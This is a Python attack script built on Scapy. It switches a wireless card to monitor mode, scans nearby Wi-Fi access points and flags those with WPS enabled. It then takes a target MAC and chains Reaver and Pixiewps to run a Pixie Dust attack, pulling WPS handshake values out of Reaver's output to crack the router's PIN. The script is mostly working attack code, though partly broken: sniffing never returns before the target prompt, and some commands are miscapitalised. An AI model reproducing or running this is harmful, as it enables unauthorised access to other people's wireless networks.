from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt,Dot11ProbeReq,Dot11ProbeResp
import chardet


os.system("ifconfig wlan0 down")
print("wlan0 down")
os.system("iwconfig wlan0 mode monitor")
print('wlan0 monitor')
os.system("ifconfig wlan0 up")
print("wlan0 up")
os.system("iwconfig")

# print("MAC:" + " "*18 + "|" + "SSID:" + " "*20  + "|" + "SIGNAL:" + " "*8 + "|" + "CHANNEL:" + " "*11 + "|" + "ENC:" + " ")

# Define a callback function to process the captured packets
def handle_packet(packet):
    # Check if the packet has the Dot11Beacon layer
    if packet.haslayer(Dot11Beacon):
        # Get the MAC address of the wifi router
        mac = packet[Dot11].addr2
        # Get the SSID of the wifi router
        ssid = packet[Dot11Elt].info.decode()
        # Get the signal strength of the wifi router
        signal = packet.dBm_AntSignal
        # Get the channel of the wifi router
        channel = int(ord(packet[Dot11Elt:3].info))
        # Get the encryption type of the wifi router
        encryption = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}").split("+")
        if "privacy" in encryption:
            encryption = "WEP"
        elif "wpa2" in encryption:
            encryption = "WPA2"
        elif "wpa" in encryption:
            encryption = "WPA"
        else:
            encryption = "OPEN"
            
        wps = False
        for elt in packet[Dot11Elt].iterpayloads():
            if elt.ID == 221 and elt.info.startswith(b"\x00\x50\xf2\x04"):
                wps = True
                break
        # Print the information of the wifi router
        print(f"MAC: {mac} | SSID: {ssid} | Signal: {signal} dBm | Channel: {channel} | Encryption: {encryption} | WPS: {wps}")

# Sniff packets from the wlan0 interface and pass them to the callback function
sniff(iface="wlan0", prn=handle_packet)

# Select the target network
mac = input("Enter the MAC of the target network: ")

# Run Reaver to get the required parameters for Pixiewps
os.system(f"reaver -i wlan0 -b {mac} -vvv -K 1 -f -O reaver.txt")
print("well")

os.system(f"Reaver -i wlan0 -b {mac} -K -vv")
os.system(f"Reaver -i wlan0 -b {mac} -p -vv")



# Extract the required parameters from the Reaver output
with open("reaver.txt", "r") as f:
    reaver_output = f.read()
    pke = reaver_output.split("PKE:")[1].split("\n")[0].strip()
    pkr = reaver_output.split("PKR:")[1].split("\n")[0].strip()
    e_hash1 = reaver_output.split("E-Hash1:")[1].split("\n")[0].strip()
    e_hash2 = reaver_output.split("E-Hash2:")[1].split("\n")[0].strip()
    authkey = reaver_output.split("AuthKey:")[1].split("\n")[0].strip()
    e_nonce = reaver_output.split("E-Nonce:")[1].split("\n")[0].strip()

# #  Run Pixiewps with the extracted parameters
print("well down")
os.system(f"pixiewps --pke {pke} --pkr {pkr} --e-hash1 {e_hash1} --e-hash2 {e_hash2} --authkey {authkey} --e-nonce {e_nonce}")

